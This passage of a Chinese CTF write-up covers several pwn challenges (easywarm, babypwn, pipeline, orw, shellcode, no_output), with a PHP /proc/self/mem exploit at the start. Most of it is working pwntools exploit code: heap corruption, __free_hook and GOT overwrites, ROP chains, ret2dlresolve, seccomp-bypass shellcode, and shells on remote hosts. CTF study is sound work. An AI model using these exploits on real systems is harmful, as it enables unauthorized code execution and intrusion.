elseif($rela && $sh_type == 4) { // SHT_RELA

$relaplt_off = unp(substr($bin, $e_shoff + $i * $e_shentsize + 24, 8));

$relaplt_size = unp(substr($bin, $e_shoff + $i * $e_shentsize + 32, 8));

$relaplt_entsize = unp(substr($bin, $e_shoff + $i * $e_shentsize + 56, 8));

}

}

​

if($rela) {

for($i = $relaplt_off; $i < $relaplt_off + $relaplt_size; $i +=
$relaplt_entsize) {

$r_offset = unp(substr($bin, $i, 8));

$r_info = unp(substr($bin, $i + 8, 8)) >> 32;

$name_off = unp(substr($bin, $dynsym_off + $r_info * $dynsym_entsize, 4));

$name = ”;

$j = $strtab_off + $name_off – 1;

while($bin[++$j] != “\0”) {

$name .= $bin[$j];

}

if($name == ‘open’) {

return $r_offset;

}

}

}

else {

for($i = $dynsym_off; $i < $dynsym_off + $dynsym_size; $i += $dynsym_entsize)
{

$name_off = unp(substr($bin, $i, 4));

$name = ”;

$j = $strtab_off + $name_off – 1;

while($bin[++$j] != “\0”) {

$name .= $bin[$j];

}

if($name == ‘__libc_system’) {

$system_offset = unp(substr($bin, $i + 8, 8));

}

if($name == ‘__open’) {

$open_offset = unp(substr($bin, $i + 8, 8));

}

}

return array($system_offset, $open_offset);

}

}

function explode($fck,$str){

$i=0;

$addr = “”;

while(isset($str[$i])){

if($str[$i]!=“-“)

$addr .= $str[$i];

else

break;

$i++;

}

return [$addr];

}

$open_php = parseelf(‘/proc/self/exe’, true);

$file = new SplFileObject(‘/proc/self/maps’, “r”);

$maps = $file->fread(20000);

$r = “/usr/lib/x86_64-linux-gnu/libc.so.6”;

$pie_base = hexdec(explode(‘-‘, $maps)[0]);

list($system_offset, $open_offset) = parseelf($r);

$mem = new SplFileObject(‘/proc/self/mem’, ‘rb’);

$mem->fseek($pie_base + $open_php);

$open_addr = unp($mem->fread(8));

$libc_start = $open_addr – $open_offset;

$system_addr = $libc_start + $system_offset;

$mem = new SplFileObject(‘/proc/self/mem’, ‘wb’);

$mem->fseek($pie_base + $open_php);

if($mem->fwrite(packlli($system_addr))) {

$t =new SplFileObject(‘/bin/sh’);

}

注： 我们其实已经可以通过 SplFileObject 函数读flag了。

**easywarm**

**逆向分析**

题目实现的功能大概有：

  1. 当程序带 666 参数启动时，进入所谓的 admin mode，实现了一个一次任意地址写最多 144 字节的任意不含换行符的内容，然后调用 exit() 的功能。
  2. 当程序带 000 参数启动时，会保存 envp 和 argv 的指针到 .bss 上，并开始一个菜单形式的迷宫游戏。
  3. 当程序收到 SIGFPE 信号的时候，会使用保存的 envp 和 argv 换为 666 参数 execve 自身，即重新运行程序并进入 admin mode 的逻辑。
  4. 迷宫游戏可以指定大小和复杂度，大小最大 32，复杂度为 1 到 5。
  5. 游戏目的为控制 👴 表示的玩家走到 🚩 表示的终点处，墙不能穿过，操作只有四方向。操作序列长度至多为 (大小+4)/复杂度/2+80 个字符。
  6. 迷宫通关后，程序会泄露出一个栈指针的低 (大小+4)/复杂度/2 位，上限为 16 位，在大小为 28 和复杂度为 1 时取到。
  7. 在菜单输入 1638 （0x666），会进行一次除 0 操作，触发 SIGFPE。由于 Hex-Rays 激进的忽略没有用的算术操作的特性，默认不会在反编译中显示出来，可以通过调整 Options -> Analysis options 2 -> 选中 Preserve potential divisions by zero 解决（对于经常分析可能有诈的程序的人，建议直接在 hexrays.cfg 里把这个调整为默认选中）。
  8. 游戏开始前会允许输入最多 12 字节的名字，放在栈上。

此外，还有一些不在明面上的东西：

  1. 3 号功能读入玩家的操作序列的时候，在大小为 32 ，复杂度为 1 时，至多可以读入 98 个字符，而 bss 上用来存玩家操作序列的数组长度只有 96，可以溢出两字节。这个数组后面放的恰好是之前保存的 envp 指针。
  2. 游戏开始前输入的名字在栈上恰好有一个残留的指针指向它，并且紧接着后面恰好是个 nullptr。

**利用**

迷宫游戏里的泄露和溢出加起来正好可以用来覆盖 envp 到指向我们输入的 name
的地方。注意随机生成的迷宫有长度在限制内的解的概率比较小，但反复让它重新生成然后 bfs 找最短路跑上若干次，总能遇到一次。

到这里，利用路径就比较清晰了。我们可以输入 1638 进入 admin mode 做一次任意写，迷宫游戏的其他功能可以帮助我们控制进入 admin mode
的时候的环境变量，但最多只能有 12 字节。 本身利用 admin mode 里的任意写的难点在于没有 leak，因此我们想法用控制环境变量弄出一个
leak 即可。 ld.so 里有很多调试用的环境变量会带来类似的安全影响，手册中甚至有提到：

Secure-execution mode For security reasons, if the dynamic linker determines
that a binary should be run in secure-execution mode, the effects of some
environment variables are voided or modified, and furthermore those
environment variables are stripped from the environment, so that the program
does not even see the definitions. Some of these environment variables affect
the operation of the dynamic linker itself, and are described below.

看一遍相关的环境变量的列表，比较有希望的有两位: LD_SHOW_AUXV 和
LD_DEBUG，前者任意设置（包括为空）时，可以使程序在加载的时候打出所有内核传过来的 auxv 的值：

AT_SYSINFO_EHDR:  0x7ffc01078000

AT_HWCAP: 1f8bfbff

AT_PAGESZ:  4096

AT_CLKTCK:  100

AT_PHDR:  0x556c0871d040

AT_PHENT: 56

AT_PHNUM: 11

AT_BASE:  0x7f1de8d32000

AT_FLAGS: 0x0

AT_ENTRY: 0x556c08723160

AT_UID: 1000

AT_EUID:  1000

AT_GID: 1000

AT_EGID:  1000

AT_SECURE:  0

AT_RANDOM:  0x7ffc01050559

AT_HWCAP2:  0x2

AT_EXECFN:  /work/easywarm

AT_PLATFORM:  x86_64

这东西是个大礼包，里面从用于决定 stack canary 的 AT_RANDOM 到栈地址（也可以用 AT_RANDOM
推出来）到库分配基址到主程序的入口点（隐含加载地址）什么的全都有。可惜 LD_SHOW_AUXV= 刚好 13 个字节，超了一个字节。

剩下的一个候选是设置 LD_DEBUG=all，刚好 12 个字节，会打印出 ld.so 加载库的时候的 log，因此可以得到 libc
的加载地址。接下来就是跟 glibc 搏斗的选手们最喜欢的传统项目了：在知道 libc 地址的情况下，任意地址写至多 144 字节一次，在 exit()
的时候劫持控制流。

这里直接交给了我们的一位不愿透露姓名的 glibc 搏斗大师，大师在一番尝试之后，发现写 __libc_atexit 节里的函数，在调用的时候满足某个
one gadget 的条件。

# -*- coding: UTF-8 -*-
from pwn import *

import collections

​

context.arch = ‘amd64’

#r = process([“./easywarm”, “000”])

r = remote(‘39.105.134.183’, 18866)

​

r.sendlineafter(“Give me your name: “, “LD_DEBUG=all”)

​

_length = None

​

def new_game(complexity, length):

global _length

_length = length + 4

r.sendlineafter(“[-] “, “1”)

r.sendlineafter(“Maze’s complexity: “, str(complexity))

r.sendlineafter(“Maze’s length: “, str(length))

r.recvuntil(“[+] Successfully created a new game!”)

​

def feed_challenge(solution, newline=True):

r.sendlineafter(“[-] “, “3”)

if newline:

r.sendlineafter(“input: “, solution)

else:

r.sendafter(“input: “, solution)

r.recvuntil(“find the flag!”)

​

def show_map():

r.sendlineafter(“[-] “, “4”)

board = r.recvlines(_length)

sanitized = []

for row in board:

row = row.decode(“utf-8”)

row = row.replace(“👴“, “P”)

row = row.replace(“🚩“, “F”)

row = row.replace(“██”, “W”)

row = row.replace(“ “, ” “)

assert len(row) == _length

sanitized.append(row)

return sanitized

​

def game_over():

r.sendlineafter(“[-] “, “5”)

​

def sigfpe():

r.sendlineafter(“[-] “, str(0x666))

​

def solve_maze(board):

n = len(board)

for i in range(n):

for j in range(n):

if board[i][j] == ‘P’:

sx, sy = i, j

break

q = collections.deque()

q.append((sx, sy))

ans = {(sx, sy): (0, None)}

dstr = “wsad”

dx = [–1, 1, 0, 0]

dy = [ 0, 0, –1, 1]

while q:

x, y = q.popleft()

if board[x][y] == “F”:

break

dist = ans[(x, y)][0]

for i in range(4):

nx, ny = x+dx[i], y+dy[i]

if nx <= 0 or nx >= n–1 or ny <= 0 or ny >= n–1 or board[nx][ny] == ‘W’ or
(nx, ny) in ans:

continue

ans[(nx, ny)] = (dist+1, i)

q.append((nx, ny))

assert board[x][y] == “F”

solution = “”

while (d := ans[(x, y)][1]) is not None:

solution += dstr[d]

x -= dx[d]

y -= dy[d]

return solution[::–1]

​

def generate(complexity, length):

while True:

new_game(complexity, length)

solution = solve_maze(show_map())

log.success(f”Solution size: {len(solution)}”)

if len(solution) < min(length/complexity/2+80, 95):

return solution

game_over()

​

solution = generate(1, 28)

feed_challenge(solution)

r.recvuntil(“flag: “)

stack_leak_lo16 = int(r.recvline())

log.success(f”Resolved stack lowest 16 bits: {stack_leak_lo16:#06x}”)

​

kOffset = 136

envp_lo16 = stack_leak_lo16 + kOffset

​

solution = generate(1, 32)

feed_challenge(solution.encode(“utf-8”).ljust(96, b”\x00″) + p16(envp_lo16),
newline=False)

log.success(“Overwrote envp.”)

sigfpe()

​

context.log_level = ‘debug’

​

r.recvuntil(“file=libc.so.6 [0]; generating link map”)

r.recvuntil(“base: “)

libc_base = int(r.recvuntil(“ size: “, drop=True), 16)

log.success(f”libc @ {libc_base:#x}”)

​

addr = libc_base+0x1ED608

​

content = p64(libc_base + 0xe6c7e)

deltastr = p64(addr – 0xADAD000)

assert b”\n” not in deltastr

input(“run”)

r.sendafter(“Where to record error?”, deltastr)

r.sendlineafter(“What error to record?”, content)

r.interactive()

**babypwn**

题目漏洞有两个，一是在add时malloc申请堆块后没有初始化，可以利用堆上的残余数据leak出heap和libc地址，二是在edit中有一个人为造的单字节溢出写零的漏洞。通过第一个漏洞leak地址后，用第二个漏洞修改__free_hook完成ROP即可。

刚开始用open+sendfile读flag和babypwn都没有读到，一度以为是远程ban了sendfile，最后使用execveat get
shell，使用bash的一些内置命令拿到了flag

# gcc unhash.c -static -o unhash

#include <stdio.h>

#include <stdlib.h>

#include <string.h>

​

unsigned int hash(unsigned a1) {

for ( int i = 2; i > 0; —i )

{

a1 ^= (32 * a1) ^ ((a1 ^ (32 * a1)) >> 17) ^ (((32 * a1) ^ a1 ^ ((a1 ^ (32 *
a1)) >> 17)) << 13);

}

​

return a1;

}

​

int main(int argc, char* argv[]) {

unsigned int after = atoi(argv[1]);

char* suffix = argv[2];

// printf(“suffix: %s\n”, suffix);

unsigned int suffix_i = 0;

sscanf(suffix, “%x”, &suffix_i);

// printf(“suffix_i: %d\n”, suffix_i);

​

unsigned int range = 0xffffffff >> (strlen(suffix) * 4);

// printf(“range: %x\n”, range);

​

for (unsigned int i = 0; i <= range; i++) {

unsigned int candidate = (i << (strlen(suffix) * 4)) + suffix_i;

if(hash(candidate) == after) {

// printf(“find it: %x\n”, candidate);

printf(“%x\n”, candidate);

return 0;

}

}

printf(“%d\n”, –1);

return 0;

}

#!/usr/bin/env python

# -*- coding: utf-8 -*-
​

from pwn import *

from time import sleep

from os import popen

context.arch = “amd64”

# context.log_level = “debug”

elf = ELF(“./babypwn”, checksec = False)

# libc = elf.libc

libc = ELF(“./libc.so.6”, checksec = False)

​

def DEBUG():

cmd = ”’

bpie 0xE69

bpie 0x10CB

bpie 0xD90

bpie 0xF9A

c

”’

gdb.attach(io, cmd)

sleep(0.5)

​

def add(size):

io.sendlineafter(“>>> \n”, “1”)

io.sendlineafter(“size:\n”, str(size))

​

def delete(idx):

io.sendlineafter(“>>> \n”, “2”)

io.sendlineafter(“index:\n”, str(idx))

​

​

def edit(idx, cont):

io.sendlineafter(“>>> \n”, “3”)

io.sendlineafter(“index:\n”, str(idx))

io.sendafter(“content:\n”, cont)

sleep(0.01)

​

def show(idx):

io.sendlineafter(“>>> \n”, “4”)

io.sendlineafter(“index:\n”, str(idx))

return int(io.recvline().strip(), 16), int(io.recvline().strip(), 16)

​

def unhash(value, suffix):

if suffix == “”:

cmd = “./unhash {} \”\””.format(value)

else:

cmd = “./unhash {} {:x}”.format(value, suffix)

# print(cmd)

res = int(popen(cmd).read().strip(), 16)

if res == –1:

print(“[-] error”)

exit(–1)

​

print(“[+] unhash({:#x}) = {:#x}”.format(value, res))

return res

​

# io = process(elf.path)

# io = process(elf.path, env = {“LD_PRELOAD”: “./libc.so.6”})

io = remote(“39.105.130.158”, 8888)

# io = remote(“172.17.0.3”, 8888)

​

for i in range(10):

add(0xf8)

add(0x18)

​

for i in range(7):

delete(i)

​

delete(8)

add(0xf8)

# DEBUG()

part2, part1= show(0)

part2 = unhash(part2, 0x1b0)

# part2 = unhash(part2, “”)

part1 = unhash(part1, “”)

heap = (part1 << 32) + part2

print(“heap @ {:#x}”.format(heap))

​

for i in range(6):

add(0xf8)

​

add(0xb0)

# DEBUG()

part2, part1 = show(8)

part2 = unhash(part2, 0xd90)

part1 = unhash(part1, “”)

libc.address = ((part1 << 32) + part2) – 0x3ebd90

print(“libc @ {:#x}”.format(libc.address))

​

for i in xrange(11):

delete(i)

​

add(0x108)

add(0x108) # overflow

add(0x108)

add(0x108)

edit(1, flat(0x21) * 33)

edit(2, flat(0x21) * 33)

edit(3, flat(0x21) * 33)

add(0x200)

​

”’

=> 0x7f279760a0a5 <setcontext+53>: mov  rsp,QWORD PTR [rdi+0xa0]

0x7f279760a0ac <setcontext+60>: mov  rbx,QWORD PTR [rdi+0x80]

0x7f279760a0b3 <setcontext+67>: mov  rbp,QWORD PTR [rdi+0x78]

0x7f279760a0b7 <setcontext+71>: mov  r12,QWORD PTR [rdi+0x48]

0x7f279760a0bb <setcontext+75>: mov  r13,QWORD PTR [rdi+0x50]

0x7f279760a0bf <setcontext+79>: mov  r14,QWORD PTR [rdi+0x58]

0x7f279760a0c3 <setcontext+83>: mov  r15,QWORD PTR [rdi+0x60]

0x7f279760a0c7 <setcontext+87>: mov  rcx,QWORD PTR [rdi+0xa8]

0x7f279760a0ce <setcontext+94>: push rcx

0x7f279760a0cf <setcontext+95>: mov  rsi,QWORD PTR [rdi+0x70]

0x7f279760a0d3 <setcontext+99>: mov  rdx,QWORD PTR [rdi+0x88]

0x7f279760a0da <setcontext+106>: mov  rcx,QWORD PTR [rdi+0x98]

0x7f279760a0e1 <setcontext+113>: mov  r8,QWORD PTR [rdi+0x28]

0x7f279760a0e5 <setcontext+117>: mov  r9,QWORD PTR [rdi+0x30]

0x7f279760a0e9 <setcontext+121>: mov  rdi,QWORD PTR [rdi+0x68]

0x7f279760a0ed <setcontext+125>: xor  eax,eax

0x7f279760a0ef <setcontext+127>: ret

”’

rop = flat(

{

0x00: “/bin/sh\x00”,

0xa0: heap + 0x800 + 0xa8, # rsp

0xa8: flat(

libc.address + 0x0000000000023e6a, # pop rsi; ret;

libc.address + 0x0000000000023e6a, # pop rsi; ret;

heap + 0x800,

libc.address + 0x000000000002155f, # pop rdi; ret;

0,

libc.address + 0x00000000001306b4, # pop rdx; pop r10; ret;

0,

0,

libc.address + 0x000000000003eb0b, # pop rcx; ret;

0,

libc.address + 0x0000000000155fc6, # pop r8; mov eax, 1; ret;

0,

​

libc.address + 0x00000000000439c8, # pop rax; ret;

322,

libc.address + 0x00000000000d2975, # syscall; ret;

​

​

# libc.address + 0x0000000000023e6a, # pop rsi; ret;

# libc.address + 0x0000000000023e6a, # pop rsi; ret;

# 0,

# libc.address + 0x000000000002155f, # pop rdi; ret;

# heap + 0x800,

# libc.address + 0x00000000000439c8, # pop rax; ret;

# 2,

# libc.address + 0x00000000000d2975, # syscall; ret;

​

​

#libc.address + 0x0000000000023e6a, # pop rsi; ret;

#3, # open fd

#libc.address + 0x00000000000439c8, # pop rax; ret;

#40,

#libc.address + 0x0000000000001b96, # pop rdx; ret;

#0,

#libc.address + 0x000000000003eb0b, # pop rcx; ret;

#0xffff,

#libc.address + 0x000000000002155f, # pop rdi; ret;

#1,

#libc.address + 0x00000000000d2975, # syscall; ret;

​

​

#libc.address + 0x000000000002155f, # pop rdi; ret;

#1,

#libc.address + 0x0000000000023e6a, # pop rsi; ret;

#libc.address,

#libc.address + 0x0000000000001b96, # pop rdx; ret;

#0x100,

#libc.address + 0x00000000000439c8, # pop rax; ret;

#1,

#libc.address + 0x00000000000d2975, # syscall; ret;

​

# libc.address + 0x000000000002155f, # pop rdi; ret;

# 5,

# libc.address + 0x0000000000023e6a, # pop rsi; ret;

# heap,

# libc.address + 0x0000000000001b96, # pop rdx; ret;

# 0x100,

# libc.address + 0x00000000000439c8, # pop rax; ret;

# 0,

# libc.address + 0x00000000000d2975, # syscall; ret;

​

# libc.address + 0x000000000002155f, # pop rdi; ret;

# 1,

# libc.address + 0x0000000000023e6a, # pop rsi; ret;

# heap,

# libc.address + 0x0000000000001b96, # pop rdx; ret;

# 0x100,

# libc.address + 0x00000000000439c8, # pop rax; ret;

# 1,

# libc.address + 0x00000000000d2975, # syscall; ret;

​

​

)

},

)

assert len(rop) <= 0x200

edit(4, rop)

​

edit(0, flat(‘0’ * 0x108))

edit(0, flat(heap + 0x3b0 + 0x10, heap + 0x3b0 + 0x10, heap + 0x3b0, heap +
0x3b0, ‘x’ * 0xe0, 0x110))

delete(1)

​

add(0x30)

add(0x30)

​

delete(5)

delete(1)

​

edit(0, flat(libc.sym[“__free_hook”]))

add(0x30)

add(0x30)

add(0x30)

​

edit(6, flat(libc.address + 0x520a5)) # setcontext + 53

# DEBUG()

# pause()

# context.log_level = “debug”

delete(4)

​

io.interactive()

**pipeline**

append的时候有个整数溢出可以导致栈溢出。show的时候可以未初始化泄露libc地址。然后改free_hook拿shell即可

import pwn

​

pwn.context.log_level = “debug”

​

def new():

p.recvuntil(“>> “)

p.sendline(‘1’)

​

def edit(idx, offset, size):

p.recvuntil(“>> “)

p.sendline(‘2’)

p.recvuntil(“index: “)

p.sendline(str(idx))

p.recvuntil(“offset: “)

p.sendline(str(offset))

p.recvuntil(“size: “)

p.sendline(str(size))

​

def append(idx, size, data):

p.recvuntil(“>> “)

p.sendline(‘4’)

p.recvuntil(“index: “)

p.sendline(str(idx))

p.recvuntil(“size: “)

p.sendline(str(size))

p.recvuntil(“data: “)

p.send(data)

​

def show(idx):

p.recvuntil(“>> “)

p.sendline(‘5’)

p.recvuntil(“index: “)

p.sendline(str(idx))

​

def delete(idx):

p.recvuntil(“>> “)

p.sendline(‘3’)

p.recvuntil(“index: “)

p.sendline(str(idx))

​

#p = pwn.remote(“172.17.0.2”, 1234)

p = pwn.remote(“59.110.173.239”, 2399)

​

new()

edit(0, 0, 0x1000)

new()

edit(0, 0, 0)

edit(0, 0, 0x1000)

show(0)

​

p.recvuntil(“data: “)

​

addr = p.recvline()[:–1]

​

addr = pwn.u64(addr.ljust(8, b’\x00′))

​

libc_base = addr – 2014176

​

print(hex(libc_base))

​

​

new()

edit(2, 0xff, 0x100)

new()

edit(3, 0, 0x100)

new()

edit(4, 0, 0x100)

append(4, 0x40, “/bin/sh\n”)

​

input()

​

write_addr = libc_base + 2026280

sys = libc_base + 349200

append(2, –2147483136, b”a” + pwn.p64(0) + pwn.p64(0x21) +
pwn.p64(write_addr)+ b’\n’)

append(3, 0x30, pwn.p64(sys) + b’\n’)

​

edit(4, 0, 0)

​

p.interactive()

**[** **强网先锋 ]orw**

题目的漏洞点在在于 分配的 index 可以为负数， 从而可以将堆地址写入 got 表

  

另外题目开启了 seccomp， 限制了只能使用open，read，write

  

程序未开启NX保护，使得堆栈可执行

  

由于shellcode只能写8字节，所以通过覆盖atoi的got表，使得shellcode变长；通过16字节shellcode写入更大的shellcode，完成orw

  

from pwn import *

​

context.arch = “amd64”

​

p = process(‘./pwn’, env={“LD_PRELOAD”:“./libseccomp.so.0”})

# p = remote(“39.105.131.68”,12354)

def choice(cho):

p.recvuntil(‘choice >>’)

p.sendline(str(cho))

​

def add(idx, size, content):

choice(1)

p.recvuntil(‘index’)

p.sendline(str(idx))

p.recvline(‘size’)

p.sendline(str(size))

p.recvline(‘content’)

p.sendline(content)

​

def delete(idx):

choice(4)

p.recvuntil(‘index:’)

p.sendline(str(idx))

​

​

# offset: -22 -> puts_got

# offset: -25 -> free_got

# offset: -14 -> atoi

​

shellcode = asm(“xor rax,rax;mov dl,0x80;mov rsi,rbp;push rax;pop
rdi;syscall;jmp rbp”)

print(len(shellcode))

​

add(0,8,“flag”)

delete(0)

add(–14, 8, asm(“jmp rdi”))

# pause()

​

p.sendline(shellcode)

# pause()

​

shellcode = shellcraft.pushstr(“/flag”)

shellcode += shellcraft.open(“rsp”)

shellcode += shellcraft.read(‘rax’, ‘rsp’, 100)

shellcode += shellcraft.write(1, ‘rsp’, 100)

​

print(len(asm(shellcode)))

p.send(asm(shellcode))

​

p.interactive()

**[** **强网先锋 ] shellcode**

首先照着[https://nets.ec/Ascii_shellcode](https://nets.ec/Ascii_shellcode)
写个x64的Ascii
shellcode调用read读shellcode。然后通过retf切换32位架构绕过seccomp执行open。最后侧信道泄露flag即可

import pwn

​

import time

​

#pwn.context.log_level = “debug”

​

def guess(idx, ch):

#p = pwn.process(‘./shellcode’)

p = pwn.remote(“39.105.137.118”, 50050)

​

shellcode = ”’

push r9;

pop rdi;

​

push rbx;

pop rsi;

​

push rbx;

pop rsp;

​

pop rax;

pop rax;

pop rax;

pop rax;

pop rax;

​

push 0x3030474a;

pop rax;

xor eax, 0x30304245;

​

push rax;

​

pop rax;

pop rax;

pop rax;

pop rax;

pop rax;

​

push r9;

pop rax;

”’

​

sh1 = ‘jmp xx;’+ “nop;”*(0x100–5)+“xx:” + ”’

mov rsp, rbx

add rsp, 0xf00

​

/* mmap(addr=0x410000, length=0x1000, prot=7, flags=’MAP_PRIVATE |
MAP_ANONYMOUS | MAP_FIXED’, fd=0, offset=0) */

push (MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED) /* 0x32 */

pop r10

xor r8d, r8d /* 0 */

xor r9d, r9d /* 0 */

mov edi, 0x1010101 /* 4259840 == 0x410000 */

xor edi, 0x1400101

push 7

pop rdx

mov esi, 0x1010101 /* 4096 == 0x1000 */

xor esi, 0x1011101

/* call mmap() */

push SYS_mmap /* 9 */

pop rax

syscall

​

/* call read(0, 0x410000, 0x1000) */

xor eax, eax /* SYS_read */

xor edi, edi /* 0 */

xor edx, edx

mov dh, 0x1000 >> 8

mov esi, 0x1010101 /* 4259840 == 0x410000 */

xor esi, 0x1400101

syscall

​

mov rsp, 0x410f00

​

mov DWORD PTR [rsp+4], 0x23

mov DWORD PTR [rsp], 0x410000

retf

”’

​

c1 = pwn.shellcraft.i386.linux.open(“flag”) + ”’

mov DWORD PTR [esp+4], 0x33

mov DWORD PTR [esp], 0x410100

retf

”’

​

c2 = pwn.shellcraft.amd64.linux.read(3, buffer=0x410300, count=0x100)

​

c3 = ”’

mov rax, 0x410300

add rax, %d

mov bl, [rax]

cmp bl, %d

jz loop

​

crash:

xor rsp, rsp;

jmp rsp;

​

loop:

jmp $\n

”’

​

c2 += c3%(idx, ch)

​

​

s1 = pwn.asm(sh1, arch=‘amd64’)

c1 = pwn.asm(c1, arch=‘i386’)

c2 = pwn.asm(c2, arch=‘amd64’)

​

shellcode = pwn.asm(shellcode, arch=‘amd64’)

​

p.sendline(shellcode)

​

time.sleep(0.1)

​

p.send(s1)

​

time.sleep(0.1)

​

p.send(pwn.flat({0:c1, 0x100:c2}))

​

try:

p.read(timeout=0.2)

p.close()

return True

except Exception:

p.close()

return False

​

​

import string

flag = ”

for i in range(0x100):

for c in string.printable:

r = guess(i, ord(c))

if r:

flag += c

print(flag)

break

**[** **强网先锋 ] no_output**

strcpy存在单字节的溢出，可以覆盖fd，改为0后可以直接从stdin读入内容，从而通过strcmp的检测

需要触发算数异常SIGFPE，可以通过-0x80000000/-1触发，触发后可以直接执行一个栈溢出；由于程序中没有输出函数，无法leak函数，所以使用ret2dlresolve方法直接getshell

  

import pwn

import time

​

pwn.context.log_level = “debug”

​

p = pwn.process(“./test”)

# p = pwn.remote(“39.105.138.97”, 1234)

​

p.send(b”\x00″*0x30)

time.sleep(0.3)

​

p.send(b”a”*0x20)

​

time.sleep(0.3)

p.send(“\x00”)

​

time.sleep(0.3)

p.sendline(“-2147483648”)

​

time.sleep(0.3)

p.sendline(“-1”)

​

time.sleep(0.3)

elf = pwn.ELF(“./test”)

rop = pwn.ROP(elf)

dlresolve = pwn.Ret2dlresolvePayload(elf, symbol=“system”, args=[“/bin/sh”])

rop.read(0, dlresolve.data_addr)

rop.ret2dlresolve(dlresolve)

raw_rop = rop.chain()

​

print(rop.dump())

print(raw_rop)

payload = pwn.fit({64+pwn.context.bytes*3: raw_rop, 256: dlresolve.payload})

print(len(payload))

​

p.send(payload)

​

p.interactive()

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **长亭科技** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/245271](/post/id/245271)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [CTF](/tag/CTF)

 **+1** __4赞

 __收藏

![](https://p0.ssl.qhimg.com/t012a2b2cc9165a693a.jpg) 长亭科技

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

